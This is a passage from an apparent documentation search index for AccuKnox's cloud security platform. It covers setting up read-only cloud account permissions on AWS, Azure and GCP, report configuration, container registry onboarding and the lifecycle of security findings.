Onboarding","text":""},{"location":"how-to/cspm-prereq-aws/#cspm-pre-requisite-for-aws","title":"CSPM Pre-requisite for AWS","text":"<p>When the AccuKnox control plane is hosted in a cloud environment, scanning is performed using Cloud account Readonly Access permissions.</p> <p></p> <p>AWS onboarding requires creation of an IAM user. Please follow the following steps to provide a user with appropriate read access:</p> <p>Step 1: Navigate to IAM \u2192 Users and click on Add Users</p> <p></p> <p>Step 2: Give a username to identify the user</p> <p></p> <p>Step 3: In the \"Set Permissions\" screen:</p> <p>a. Select \"Attach policies directly\"</p> <p>b. Search \"ReadOnly\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>c. Search \"SecurityAudit\", Filter by Type: \"AWS managed - job function\" and select the policy</p> <p></p> <p>Step 4: Finish creating the user. Click on the newly created user and create the Access key and Secret Key from the Security Credentials tab to be used in the AccuKnox panel</p> <p></p>"},{"location":"how-to/cspm-prereq-aws/#aiml-security-prerequisites-for-aws-cloud-accounts","title":"AI/ML Security Prerequisites for AWS Cloud Accounts","text":"<p>Permissions for AI Asset Scanning (AWS):</p> <ul> <li> <p>General Scan Permission (Required):</p> <ul> <li>Create an IAM User and attach the following managed policies:<ul> <li><code>ReadOnly</code> (AWS managed \u2013 job function)</li> <li><code>SecurityAudit</code> (AWS managed \u2013 job function)</li> </ul> </li> </ul> </li> <li> <p>Permissions for AI Asset Scanning:</p> <ul> <li> <p>Create an IAM User and attach the following managed policies:</p> <ul> <li><code>ReadOnly</code> (AWS managed \u2013 job function)</li> <li><code>SecurityAudit</code> (AWS managed \u2013 job function)</li> </ul> </li> <li> <p>Create an inline policy with the following permissions:</p> <ul> <li> <p>AWS Bedrock:</p> <ul> <li><code>bedrock:InvokeModel</code></li> <li><code>bedrock:ListImportedModels</code></li> <li><code>bedrock:ListModelInvocationJobs</code></li> </ul> </li> <li> <p>AWS SageMaker:</p> <ul> <li><code>sagemaker:InvokeEndpoint</code></li> </ul> </li> </ul> </li> </ul> </li> </ul>"},{"location":"how-to/cspm-prereq-aws/#steps-to-configure-iam-user-for-ai-asset-scanning-aws","title":"Steps to Configure IAM User for AI Asset Scanning (AWS)","text":"<p>Navigate to IAM &gt; Users &gt; Create User.</p> <p></p> <p>Select the AWS managed policies ReadOnlyAccess and SecurityAudit to attach to the user.</p> <p></p> <p>Go to Add Permissions &gt; Create inline policy. For Bedrock Permissions, select the service Bedrock, allow the actions InvokeModel, ListImportedModels, and ListModelInvocationJobs, and choose All under resources.</p> <p> </p> <p>For SageMaker Permissions, add another set of permissions by selecting the service SageMaker, allowing the action InvokeEndpoint, and choosing All under resources.</p> <p> </p> <p>Finally, review and create the policy to attach it to the IAM user.</p> <p> </p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/cspm-prereq-azure/","title":"Pre-requisite for Azure Cloud Account Onboarding","text":""},{"location":"how-to/cspm-prereq-azure/#cspm-pre-requisite-for-azure","title":"CSPM Pre-requisite for Azure","text":"<p>When the AccuKnox control plane is hosted in a cloud environment, scanning is performed using Cloud account Readonly Access permissions.</p> <p></p> <p>For Azure Onboarding it is required to register an App and giving Security read access to that App from the Azure portal.</p> <p>Step 1: Go to your Azure Portal and search for App registrations and open it</p> <p></p> <p>Step 2: Here click on New registration</p> <p></p> <p>Step 3: Give your application a name, remember this name as it will be used again later, For the rest keep the default settings</p> <p></p> <p>Step 4: Now your application is created,  save Application ID and Directory ID as they will be needed to for onboarding on AccuKnox Saas and then click on \u2018Add a certificate or secret\u2019</p> <p></p> <p>Step 5: Click on new client secret and enter the name and expiration date to get secret id and secret value, save this secret value as this will also be needed for onboarding.</p> <p></p> <p>Step 6: Next, go to API permissions tab and click on 'Add  permission'</p> <p></p> <p>Step 7: On the screen that appears, click on 'Microsoft Graph'</p> <p></p> <p>Step 8: Next, select Application Permissions and then search for Directory.Read.All and click on Add permissions</p> <p></p> <p>Step 9: Select \u2018Grant Admin Consent\u2019 for Default Directory and click on \u2018Yes\u2019</p> <p></p> <p>Step 10: Now we need to give Security read permissions to this registered Application , to do that go to subscriptions</p> <p></p> <p>Step 11: First save the subscription ID and click on the subscription name , here it is \u201cMicrosoft Azure Sponsorship\u201c</p> <p></p> <p>Step 12: Navigate to Access control(IAM) and go to Roles , here select Add and Add role assignment</p> <p></p> <p>Step 13: Search for \u201cSecurity Reader\u201d Job function Role, select it and press next</p> <p></p> <p>Step 14: In the member section click on Select members it will open a dropdown menu on the right hand side</p> <p></p> <p>Step 15: Here search for the Application that you registered in the beginning , select the application and click on review and assign.</p> <p></p> <p>Step 16: Similarly, we have to add another role. This time, search for Log Analytics Reader. Select it and click next</p> <p></p> <p>Step 17: Now, click on Select members, select the application that was created similar to the previous role. Finally, click on Review and Assign.</p> <p></p>"},{"location":"how-to/cspm-prereq-azure/#aiml-security-prerequisites-for-azure-cloud-accounts","title":"AI/ML Security Prerequisites for Azure Cloud Accounts","text":"<p>Permissions for AI Asset Scanning (Azure):</p> <ul> <li> <p>Create a role with built-in Reader permissions</p> <ul> <li>Assign the Reader role at the subscription or resource group level.</li> </ul> </li> <li> <p>Create a custom role with the following actions:</p> <ul> <li><code>Microsoft.MachineLearningServices/workspaces/onlineEndpoints/score/action</code></li> <li><code>Microsoft.MachineLearningServices/serverlessEndpoints/listKeys/action</code></li> <li><code>Microsoft.Storage/storageAccounts/listKeys/action</code></li> <li><code>Microsoft.MachineLearningServices/workspaces/batchEndpoints/score/action</code></li> </ul> </li> </ul> <p>SCHEDULE DEMO</p>"},{"location":"how-to/cspm-prereq-gcp/","title":"Pre-requisite for GCP Cloud Account Onboarding","text":""},{"location":"how-to/cspm-prereq-gcp/#cspm-pre-requisite-for-gcp","title":"CSPM Pre-requisite for GCP","text":"<p>When the AccuKnox control plane is hosted in a cloud environment, scanning is performed using Cloud account Readonly Access permissions.</p> <p></p> <p>Note: Make sure the Below API Library is enabled in your GCP Account for onboarding into AccuKnox SaaS:</p> <ol> <li>Compute Engine API</li> <li>Identity and Access Management (IAM) API</li> <li>Cloud Resource Manager API</li> <li>Cloud Functions API</li> <li>KMS API</li> <li>Kubernetes API</li> <li>Cloud SQL Admin API</li> </ol> <p>For GCP there is a requirement for IAM Service Account Access.</p> <p>Step 1:  Log into your Google Cloud console and navigate to  IAM &amp; Admin choose \u201cRoles\u201c and Click \u201cCreate Role\u201c</p> <p></p> <p>Step 2:  Name the \u201cRole\u201d and Click \u201cAdd Permission\u201d</p> <p></p> <p>Step 3:  Use the Service: storage filter then value as \u201cstorage.buckets.getIamPolicy\u201c</p> <p></p> <p>Step 4: Choose the permission and Click \u201cAdd\u201c then Click Create in the same page.</p> <p></p> <p>Step 5:  In the Navigation Panel, navigate to IAM Admin &gt; Service Accounts.</p> <p></p> <p>Step 6: Click on \"Create Service Account\"</p> <p></p> <p>Step 7: Enter any name that you want on Service Account Name.</p> <p>Step 8: Click on Continue.</p> <p></p> <p>Step 9: Select the role: Project &gt; Viewer and click Add another Role.</p> <p></p> <p>Step 10: Click \u201cAdd Another Role\u201d Choose \u201cCustom\u201c Select the created Custom Role.</p> <p></p> <p>Step 11: Click on \u201cContinue\u201c and \u201dDone\u201d</p> <p></p> <p>Step 12: Go to the created Service Account, click on that Service Account navigate to the \u201cKeys\u201c section.</p> <p></p> <p>Step 13: Click the \u201cAdd key\u201c button and \u201cCreate new key \u201c . Chosen Key type should be JSON format.</p> <p></p> <p>Step 14: Click the \u201cCreate\u201c button it will automatically download the JSON key.</p>"},{"location":"how-to/cspm-prereq-gcp/#aiml-security-prerequisites-for-gcp-cloud-accounts","title":"AI/ML Security Prerequisites for GCP Cloud Accounts","text":"<p>Permissions for Vertex AI (GCP) Access Control:</p> <p>Ref - Vertex AI Docs</p> <ul> <li> <p>Basic roles (apply broadly to cloud resources)</p> <ul> <li>Viewer (for general cloud assets)</li> <li>Security Reviewer</li> </ul> </li> <li> <p>Predefined roles specific to Vertex AI / Storage</p> <ul> <li>Vertex AI Viewer</li> <li>Storage Bucket Viewer</li> <li>Storage Object Viewer</li> </ul> </li> <li> <p>Custom role</p> <ul> <li>A role containing only the <code>aiplatform.endpoints.predict</code> permission<ul> <li>Grants ability to call (invoke) Vertex AI endpoints</li> <li>Does not grant permissions to manage or deploy endpoints</li> </ul> </li> </ul> </li> </ul> <p>Note</p> <p>You need to get a JSON private key with the service account to onboard the GCP account into AccuKnox SaaS. This can be done by following the CSPM pre-requisite steps mentioned above.</p> <p>Screenshots for enabling AI related permissions are shown below:</p> <p> </p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/custom-reports/","title":"How to Configure Custom Reports","text":"<p>AccuKnox's latest feature update provides new custom reporting feature capabilities that can help users get the reports customized as per their requirements.</p> <p>NOTE</p> <p>For this feature to be enabled the customers need to inform the Support team(support@accuknox.com) regarding their requirements for custom reporting. Then the AccuKnox Support team can configure the report template from the backend. After which the users can generate an on-demand report or configure a scheduled report.</p> <p>To generate an on-demand or scheduled report, users must follow the steps below.</p>"},{"location":"how-to/custom-reports/#on-demand-custom-report-generation","title":"On-demand custom Report generation","text":"<p>Step 1: Users will need to navigate to the Reports-&gt;Custom Reports Section.</p> <p></p> <p>Step 2: Now the users will need to select any one report which they want to configure from the customized reports that are shown in the UI.</p> <p></p> <p>Step 3: Users can configure the report as a scheduled report or generate it as an on-demand one. Users can select any one option and fill out the necessary details. Like if it is an on-demand report the users will need to fill in the following fields</p> <p>Like the report name, an email address where the report needs to be sent, and the duration for which the report needs to be generated from the drop-down list options shown in the UI. After filling out these options the save button will be enabled and users can save it.</p> <p></p> <p>Step 4: Once the on-demand report is saved the users can see the report in the UI with the progress state mentioned</p> <p></p> <p>Step 5: After the report generation is completed you can see the Generate option in the UI as well as the report will be mailed to the email address. If the user wants to see the report in the UI they can click on the Generate report.</p> <p></p>"},{"location":"how-to/custom-reports/#scheduling-custom-report","title":"Scheduling Custom Report","text":"<p>Step 1: Users will need to navigate to the Reports-&gt;Custom Reports Section.</p> <p></p> <p>Step 2: Now the users will need to select any one report which they want to configure from the customized reports that are shown in the UI.</p> <p></p> <p>Step 3: Now the users will have the option to configure the report as a scheduled report or generate it as an on-demand one. Users can select any one option and fill out the necessary details. If the users want to schedule a custom report then they will have to fill out the following details like name, duration, and scheduling frequency. AccuKnox provides 3 scheduling frequency options.</p> <ol> <li> <p>Daily Report: users can select the frequency as daily to receive the report every day at the configured time. </p> </li> <li> <p>Weekly: Users can also schedule the report weekly and select the day on a week when the report needs to be generated. </p> </li> <li> <p>Monthly: Users can also configure the report duration as monthly where they will be getting the report on the 1<sup>st</sup> of every month. It will soon be configurable as the user-defined date as well. </p> </li> </ol> <p>Step 4: Once the report generation is completed you can see the View option in the UI as well as the report will be mailed to the email address. If the user wants to see the report in the UI they can click on the View.</p> <p></p>"},{"location":"how-to/cwpp-reports-generation/","title":"CWPP Report Generation","text":"<p>Understand the Regex to Select the Cluster Name and Namespace</p> <p>The CWPP report generation utilizes regular expressions (regex) to specify and filter cluster names and namespaces. The syntax for regex follows a particular pattern to ensure accurate selection.</p>"},{"location":"how-to/cwpp-reports-generation/#regex","title":"Regex","text":"<p>Regex Syntax Format:\u00a0Cluster\u00a0Name Selection / Namespace Selection</p>"},{"location":"how-to/cwpp-reports-generation/#rules-for-regular-expression","title":"Rules for Regular Expression","text":"<p>Excluding</p> <ul> <li>To exclude a specific cluster or namespace, prefix it with a hyphen (-).</li> </ul> <p>NOTE</p> <p>To exclude any cluster or namespace, it must be included in the selection first.</p> <p>Select all</p> <ul> <li>Use an asterisk (*) to select all clusters or namespaces.</li> </ul> <p>Delimiter</p> <ul> <li>A forward slash (/) is used to delimit the cluster name selection from the namespace selection.</li> </ul>"},{"location":"how-to/cwpp-reports-generation/#examples","title":"Examples","text":"<ul> <li><code>cluster1/ns1</code>: Include only namespace\u00a0ns1\u00a0from cluster\u00a0cluster1.</li> <li><code>cluster1/*</code>: Include all namespaces from cluster\u00a0cluster1.</li> <li><code>cluster1/ns*</code>: Include namespaces starting with\u00a0ns\u00a0from cluster\u00a0cluster1.</li> <li><code>-cluster1/ns3</code>: Exclude namespace\u00a0ns3\u00a0from cluster\u00a0cluster1.</li> <li><code>*/ns1</code>: Include namespace\u00a0ns1\u00a0from all clusters.</li> <li><code>*/*</code>: Include all namespaces from all clusters.</li> </ul>"},{"location":"how-to/cwpp-reports-generation/#reports-configuration","title":"Reports Configuration","text":"<p>Reports can be configured in two ways: On Demand and Scheduled.</p>"},{"location":"how-to/cwpp-reports-generation/#1-on-demand-report-configuration","title":"1. On Demand Report Configuration","text":"<p>In On Demand Report, you can generate the report for the clusters shortly after the configuration is completed.</p> <p>To generate On Demand reports:</p> <p>Step 1:\u00a0Add CWPP Report Configuration</p> <ul> <li>Go to the Reports section in AccuKnox SaaS.</li> <li>Choose \"On Demand\" from the drop-down menu.</li> </ul> <p></p> <p>Step 2:\u00a0In the Configuration user needs to provide the details about Name, Description and Cluster and NameSpace.</p> <p>NOTE</p> <p>The cluster field drop-down will show all the clusters that are active during the report generation.</p> <p></p> <p>By clicking\u00a0Save and Generate Report\u00a0it will generate the report in the PDF format as per the selected duration.</p> <p></p>"},{"location":"how-to/cwpp-reports-generation/#2-scheduled-report-configuration","title":"2. Scheduled Report Configuration","text":"<p>To get the report of the clusters automatically as per the frequency that\u00a0choosen\u00a0.i.e by weekly or by monthly or daily this is the go to way.</p> <p>Step 1:\u00a0To\u00a0Add CWPP report configuration as Scheduled and choose the\u00a0Scheduled\u00a0option from the drop down.</p> <p></p> <p>Step 2:\u00a0In the Configuration user needs to provide the details about their Name, Email, Selecting the Cluster, Namespace in the regex format and Frequency of the report then click the\u00a0Generate Report.</p> <p></p> <p> Step 3:\u00a0After finishing the configuration the report would be scheduled to be sent to you in the email. Users can reconfigure the past configurations by clicking on them to edit the configuration.</p> <p></p> <p>NOTE</p> <p>The report will be sent to the Email-ID daily at 09.00AM UTC.</p>"},{"location":"how-to/docker-trusted/","title":"Docker Trusted Registry Onboarding","text":"<p>Docker Trusted Registry is a private image storage solution that allows enterprises to securely manage and distribute Docker images within their organization. It integrates seamlessly with Docker and provides advanced features such as image signing, role-based access control, and vulnerability scanning.</p>"},{"location":"how-to/docker-trusted/#prerequisites","title":"Prerequisites","text":""},{"location":"how-to/docker-trusted/#docker-trusted-registry","title":"Docker Trusted Registry","text":"<ul> <li> <p>Requires:</p> <ul> <li> <p>Registry URL</p> </li> <li> <p>Toggle Self-Signed Certificate if applicable</p> </li> <li> <p>Username</p> </li> <li> <p>Password</p> </li> <li> <p>Kubernetes Cluster (In case of Isolated Registry)</p> </li> </ul> </li> <li> <p>Explanation:</p> <ul> <li> <p>Docker Trusted Registry (DTR) is a private Docker image storage solution designed for enterprises. It provides advanced security features, allowing the storage of Docker images on-premises or in a private cloud. The self-signed certificate option ensures secure communication if DTR is configured with custom SSL certificates.</p> </li> <li> <p>Isolated Registry:</p> <ul> <li> <p>If you want to run scans on the registry directly from your Kubernetes cluster, enable this option.</p> </li> <li> <p>If not, leave it unchecked.</p> </li> </ul> </li> </ul> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#setting-up-kubernetes-cluster-for-isolated-registry-optional","title":"Setting Up Kubernetes Cluster for Isolated Registry (Optional)","text":""},{"location":"how-to/docker-trusted/#1-navigate-to-cluster-management","title":"1. Navigate to Cluster Management","text":"<ul> <li>Go to Settings &gt; Manage Cluster &gt; Onboard Now.</li> </ul>"},{"location":"how-to/docker-trusted/#2-enable-scanner-for-isolated-registry-scan","title":"2. Enable Scanner for Isolated Registry Scan","text":"<ul> <li> <p>Enter the Cluster Name.</p> </li> <li> <p>Click Save and Next</p> </li> <li> <p>Toggle the option Enable Scanner for Isolated Registry Scan.</p> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#3-install-agent","title":"3. Install Agent","text":"<ul> <li> <p>Copy the agent installation command provided.</p> </li> <li> <p>Run the commands on the machine with access to the Kubernetes cluster.</p> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#steps-to-add-a-registry","title":"Steps to Add a Registry","text":""},{"location":"how-to/docker-trusted/#1-navigate-to-the-registry-scan-section","title":"1. Navigate to the Registry Scan Section","text":"<ul> <li>Go to Issues &gt; Registry Scan.</li> </ul>"},{"location":"how-to/docker-trusted/#2-add-a-new-registry","title":"2. Add a New Registry","text":"<ul> <li>Click on Add Registry.</li> </ul>"},{"location":"how-to/docker-trusted/#3-provide-registry-details","title":"3. Provide Registry Details","text":"<ul> <li> <p>Registry Name: Enter a name for your registry.</p> </li> <li> <p>Label: Add a label to associate findings to a particular label.</p> </li> <li> <p>Description: Provide additional information about the registry.</p> </li> <li> <p>Registry Type: Select Docker Hub from the dropdown menu.</p> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#4-authentication-type","title":"4. Authentication Type","text":"<ul> <li> <p>Choose Docker Trusted Registry:</p> <ul> <li> <p>Provide the Registry URL.</p> </li> <li> <p>Toggle the Self-Signed Certificate option if applicable.</p> </li> <li> <p>Enter Username and Password.</p> </li> <li> <p>Isolated Registry:</p> <ul> <li> <p>An isolated registry refers to a private environment where the registry is accessible only through specific network configurations, such as VPNs or private networks.</p> </li> <li> <p>If you want to run scans on the registry directly from your Kubernetes cluster, enable this option.</p> </li> <li> <p>If not, leave it unchecked.</p> </li> </ul> </li> </ul> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#5-configure-advanced-settings","title":"5. Configure Advanced Settings","text":""},{"location":"how-to/docker-trusted/#image-updated-within-last","title":"Image Updated Within Last:","text":"<ul> <li> <p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images updated within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the update time.</p> </li> </ul> </li> </ul>"},{"location":"how-to/docker-trusted/#image-pulled-within-last","title":"Image Pulled Within Last:","text":"<ul> <li> <p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images pulled within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the pull time.</p> </li> </ul> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#nametag-pattern","title":"Name/Tag Pattern:","text":"<p>Specify patterns to include or exclude images for scanning. Use the <code>-</code> symbol to explicitly exclude patterns.</p> <ul> <li> <p>By default, images are excluded unless explicitly included through patterns.</p> </li> <li> <p>To exclude specific images, use the <code>-</code> symbol. For example:</p> <ul> <li> <p>To exclude <code>cwpp/ubuntu:v1</code>, use the pattern <code>-*:v1</code>.</p> </li> <li> <p>To include <code>cwpp/ubuntu:latest</code>, specify a pattern like <code>*:latest</code>.</p> </li> </ul> </li> </ul> <p>Note: Only images matching the pattern will be scanned. For instance, using <code>*:latest</code> ensures only images with the latest tags are scanned.</p> <p></p>"},{"location":"how-to/docker-trusted/#schedule-and-certificate","title":"Schedule and Certificate:","text":"<ul> <li> <p>Set the scan schedule using a CRON expression. For example:</p> <ul> <li>CRON Expression: <code>18 minute 07 hour * day (month) * month * day (week)</code>.</li> </ul> </li> </ul> <p></p> <ul> <li> <p>Toggle Trigger Scan on Save to directly initiate the scan for the first time without waiting for the scheduled time.</p> </li> <li> <p>Finally add Self-Signed Certificate.</p> </li> </ul> <p></p>"},{"location":"how-to/docker-trusted/#viewing-registry-scan-details","title":"Viewing Registry Scan Details","text":"<p>Once the configuration is complete, your registry is ready for scanning. Scans will occur based on the defined schedule and criteria. Ensure all advanced settings align with your organizational requirements for optimal results.</p> <p>To view the scan results:</p> <ol> <li> <p>Navigate to Issues &gt; Registry Scan.</p> </li> <li> <p>Find your repository to view the findings.</p> </li> </ol> <p></p> <ol> <li>Alternatively, select Scan Queue to check the scan status.</li> </ol> <p></p>"},{"location":"how-to/dockerhub/","title":"Dockerhub Registry Onboarding","text":"<p>Docker Hub is a cloud-based repository for storing, sharing, and managing Docker container images. It's like a library for container images, where you can find and download pre-built images or upload your own.</p>"},{"location":"how-to/dockerhub/#prerequisites","title":"Prerequisites","text":""},{"location":"how-to/dockerhub/#personal-account","title":"Personal Account","text":"<ul> <li> <p>Requires:</p> <ul> <li> <p>Username</p> </li> <li> <p>Password</p> </li> </ul> </li> <li> <p>Explanation: A personal account is used by individual users who own or manage their own Docker Hub repositories. These credentials authenticate access to the user's personal space in Docker Hub.</p> </li> </ul> <p></p>"},{"location":"how-to/dockerhub/#organization-account","title":"Organization Account","text":"<ul> <li> <p>Requires:</p> <ul> <li> <p>Organization Name</p> </li> <li> <p>Username</p> </li> <li> <p>Password</p> </li> </ul> </li> <li> <p>Explanation: An organization account is suitable for teams and enterprises managing shared Docker Hub repositories. It allows multiple users to collaborate under a unified organization while maintaining individual user roles and permissions.</p> </li> </ul> <p>Note: Users must have pull permissions to access images stored in the enterprise repositories.</p> <p></p>"},{"location":"how-to/dockerhub/#steps-to-add-a-registry","title":"Steps to Add a Registry","text":""},{"location":"how-to/dockerhub/#1-navigate-to-the-registry-scan-section","title":"1. Navigate to the Registry Scan Section","text":"<ul> <li>Go to Issues &gt; Registry Scan. </li> </ul>"},{"location":"how-to/dockerhub/#2-add-a-new-registry","title":"2. Add a New Registry","text":"<ul> <li>Click on Add Registry. </li> </ul>"},{"location":"how-to/dockerhub/#3-provide-registry-details","title":"3. Provide Registry Details","text":"<ul> <li> <p>Registry Name: Enter a name for your registry.</p> </li> <li> <p>Label: Add a label to associate findings to a particular label.</p> </li> <li> <p>Description: Provide additional information about the registry.</p> </li> <li> <p>Registry Type: Select Docker Hub from the dropdown menu.</p> </li> </ul> <p></p>"},{"location":"how-to/dockerhub/#4-authentication-type","title":"4. Authentication Type","text":"<ul> <li> <p>Choose an appropriate authentication type based on your Docker Hub configuration:</p> </li> <li> <p>Personal: Requires your Docker Hub Username and Password.</p> </li> </ul> <p></p> <ul> <li>Organization: Requires your Organization Name, Username, and Password.</li> </ul> <p></p>"},{"location":"how-to/dockerhub/#5-configure-advanced-settings","title":"5. Configure Advanced Settings","text":""},{"location":"how-to/dockerhub/#image-updated-within-last","title":"Image Updated Within Last","text":"<p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images updated within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the update time.</p> </li> </ul>"},{"location":"how-to/dockerhub/#image-pulled-within-last","title":"Image Pulled Within Last","text":"<p>Choose one of the following options:</p> <ul> <li> <p>X Days: Scans only images pulled within the last X days.</p> </li> <li> <p>All: Scans all images, regardless of the pull time.</p> </li> </ul> <p></p>"},{"location":"how-to/dockerhub/#nametag-pattern","title":"Name/Tag Pattern:","text":"<p>Specify patterns to include or exclude images for scanning. Use the <code>-</code> symbol to explicitly exclude patterns.</p> <p>By default, images are excluded unless explicitly included through patterns.</p> <p>To exclude specific images, use the <code>-</code> symbol. For example:     - To exclude <code>cwpp/ubuntu:v1</code>, use the pattern <code>-*:v1</code>.     - To include <code>cwpp/ubuntu:latest</code>, specify a pattern like <code>*:latest</code>.</p> <p>Note: Only images matching the pattern will be scanned. For instance, using <code>*:latest</code> ensures only images with the latest tags are scanned.</p> <p></p>"},{"location":"how-to/dockerhub/#schedule-and-certificate","title":"Schedule and Certificate","text":"<p>Set the scan schedule using a CRON expression. For example:     - CRON Expression: <code>18 minute 07 hour * day (month) * month * day (week)</code>.</p> <p></p> <p>Toggle Trigger Scan on Save to directly initiate the scan for the first time without waiting for the scheduled time.</p>"},{"location":"how-to/dockerhub/#viewing-registry-scan-details","title":"Viewing Registry Scan Details","text":"<p>Once the configuration is complete, your registry is ready for scanning. Scans will occur based on the defined schedule and criteria. Ensure all advanced settings align with your organizational requirements for optimal results.</p> <p>To view the scan results:</p> <ol> <li> <p>Navigate to Issues &gt; Registry Scan.</p> </li> <li> <p>Find your repository to view the findings. </p> </li> <li> <p>Alternatively, select Scan Queue to check the scan status. </p> </li> </ol>"},{"location":"how-to/ecr/","title":"Elastic Container Registry (ECR) Onboarding","text":"<p>AccuKnox CSPM security tool scans images that are present in the onboarded Amazon Elastic Container Registry and identifies any known vulnerabilities and risks associated with those images. These are then categorized based on their severity. User will be getting comprehensive view of these risks and vulnerabilities in the dashboard which can be remediated.</p>"},{"location":"how-to/ecr/#steps-to-create-iam-user-in-aws-for-onboarding-ecr","title":"Steps to create IAM User in AWS for onboarding ECR","text":"<p>Step 1: Open the AWS Management Console and sign in with your AWS account credentials.</p> <p>Step 2: Go to the IAM console by selecting Services in the top left corner, then under Security, Identity, &amp; Compliance, click on IAM</p> <p></p> <p>Step 3: Click on Policies in the left navigation pane to view the list of existing policies. Click the Create policy button.</p> <p></p> <p>Step 4: Select JSON from Policy Editor and insert the following JSON</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Action\": [\n        \"ecr-public:DescribeImages\",\n        \"ecr-public:GetAuthorizationToken\",\n        \"ecr-public:DescribeRepositories\",\n        \"ecr:DescribeImages\",\n        \"ecr:GetAuthorizationToken\",\n        \"ecr:DescribeRepositories\",\n        \"sts:GetServiceBearerToken\",\n        \"ecr:BatchGetImage\",\n        \"ecr:GetDownloadUrlForLayer\"\n      ],\n      \"Resource\": \"*\"\n    }\n  ]\n}\n</code></pre> <p></p> <p>Step 5: On the next page, enter the Policy name and click on Create policy</p> <p></p> <p>Step 6: Click on Users in the left navigation pane to view the list of existing users. Select the user whom you want to add the policies to</p> <p></p> <p>Step 7: Click on Add permissions button in the user and select the Attach policies directly option to select the custom policies that is created</p> <p></p> <p>Step 8: Switch to Security credentials and click on Create access keys</p> <p></p> <p>Select Third Party Service and complete creating the Access Keys</p> <p></p> <p>Copy the Access and Secret Access Keys for onboarding the registry on AccuKnox SaaS.</p> <p></p>"},{"location":"how-to/ecr/#steps-to-onboard-the-registry-on-accuknox-saas","title":"Steps to onboard the registry on AccuKnox SaaS","text":"<p>Step 1: Login to the AccuKnox SaaS and Navigate to Issues \u2192 Registry Scan. Click on Add Registry</p> <p></p> <p>Step 2: Enter the Registry Name, Registry Type, AWS Region of the ECR Registry along with Access key and Secret Access key from the IAM user that was copied.</p> <p>Click on Test Connection and then click on the enabled Save button</p> <p></p> <p>Step 3: A popup appears that the registry is added on successful onboarding. Navigate to Issues \u2192 Registry Scan to view the scan results. You can check the status of the scan from the Scan Queue tab</p> <p></p> <p>SCHEDULE DEMO</p>"},{"location":"how-to/findings-lifecycle/","title":"Findings Lifecycle","text":"<p>AccuKnox's Findings Lifecycle is designed to help you efficiently manage security issues from initial detection to final resolution. It provides a structured workflow to track, prioritize, and remediate vulnerabilities, ensuring you can focus on what matters most and reduce alert fatigue.</p> <p>This lifecycle applies to all finding types, including Infrastructure as Code (IaC), container images, Kubernetes, and more.</p> <p></p>"},{"location":"how-to/findings-lifecycle/#how-the-lifecycle-works","title":"How the Lifecycle Works","text":"<p>The lifecycle of a finding is managed through status flags. AccuKnox helps by automatically updating statuses based on scan results while still giving you the flexibility to manage them manually.</p>"},{"location":"how-to/findings-lifecycle/#automated-status-updates","title":"Automated Status Updates","text":"<p>To streamline your workflow, AccuKnox automatically tracks and updates the status of findings across scans:</p> <ol> <li> <p>First Scan \u2013 Finding Detected    Any new finding is automatically assigned the <code>Active</code> status.</p> </li> <li> <p>Second Scan \u2013 Finding Not Detected    If the issue has been remediated and is no longer detected, the status changes to <code>Waiting for Verification</code>.</p> </li> <li> <p>Third Scan \u2013 Still Not Detected    If the finding remains absent in the third consecutive scan, the system marks it as <code>Fixed</code>.</p> </li> </ol>"},{"location":"how-to/findings-lifecycle/#manual-status-management","title":"Manual Status Management","text":"<p>For more complex workflows, you can manually update a finding\u2019s status from its detail view.</p> <p>Available statuses include:</p> <ul> <li><code>Active</code>: New, unaddressed finding.</li> <li><code>In Progress</code>: Being actively remediated.</li> <li><code>Waiting for 3rd Party</code>: Blocked by an external team or vendor.</li> <li><code>Potential</code>: Needs further investigation to confirm.</li> <li><code>Accepted Risk</code>: Reviewed and accepted by your organization.</li> <li><code>Duplicate</code>: Duplicate of an existing finding.</li> <li><code>Exception Requested</code>: An exception has been formally requested.</li> <li><code>Waiting for Verification</code>: Fix applied; awaiting confirmation.</li> <li><code>Fixed</code>: Remediation completed and verified.</li> </ul>"},{"location":"how-to/findings-lifecycle/#managing-and-remediating-findings","title":"Managing and Remediating Findings","text":"<p>Use the lifecycle features to reduce noise and actively improve your security posture.</p>"},{"location":"how-to/findings-lifecycle/#1-filter-to-focus-your-view","title":"1. Filter to Focus Your View","text":"<p>The Findings page may contain thousands of items. Use the Filter panel to narrow down your list by:</p> <ul> <li>Status (e.g., <code>Active</code>)</li> <li>Asset Name</li> <li>Risk Factor</li> <li>Framework</li> </ul> <p>This helps your team stay focused. </p>"},{"location":"how-to/findings-lifecycle/#2-investigate-and-remediate-with-guided-solutions","title":"2. Investigate and Remediate with Guided Solutions","text":"<p>Click on any finding to view detailed context. Navigate to the Solution tab for:</p> <ul> <li>Step-by-step remediation instructions</li> <li>Pre-generated code snippets</li> <li>Links to relevant documentation</li> </ul> <p></p>"},{"location":"how-to/findings-lifecycle/#3-integrate-with-your-workflow-ticketing","title":"3. Integrate with Your Workflow (Ticketing)","text":"<p>Need to involve your team or track progress externally? Use the Create Ticket button to integrate findings with tools like:</p> <ul> <li>Jira</li> <li>ServiceNow</li> <li>Other ticketing systems (see all integrations here)</li> </ul> <p></p>"},{"location":"how-to/findings-lifecycle/#benefits-of-using-the-findings-lifecycle","title":"Benefits of Using the Findings Lifecycle","text":"<ul> <li>Reduce Noise: Automatically close fixed vulnerabilities and highlight active ones.</li> <li>Streamline Remediation: Apply a consistent, structured process across your team.</li> <li>Improve Collaboration: Status updates and ticketing integrations ensure alignment.</li> <li>Audit Trail: Maintain a complete history of actions for each finding \u2014 perfect for compliance and reporting.</li> </ul>"},{"location":"how-to/gar/","title":"Google Artifact Registry (GAR) Onboarding","text":"<p>When Google Artifact Registry with images is onboarded into AccuKnox 